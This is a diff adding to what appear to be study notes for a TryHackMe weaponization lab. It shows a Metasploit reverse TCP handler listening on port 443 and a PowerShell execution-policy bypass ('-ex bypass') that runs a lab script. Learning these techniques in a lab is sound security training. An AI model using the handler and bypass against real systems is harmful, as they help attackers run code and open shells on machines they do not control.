@@ -94,3 +94,23 @@ msf5 exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 10.50.159.15:443 
 ```
+
+## PowerShell (PSH)
+### Execution Policy
+```
+C:\Users\thm\Desktop>powershell -File thm.ps1
+File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
+information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
+    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+```
+```
+PS C:\Users\thm> Get-ExecutionPolicy
+Restricted
+```
+### Bypass Execution Policy
+`-ex bypass`
+```
+C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
+Welcome to Weaponization Room!
+```
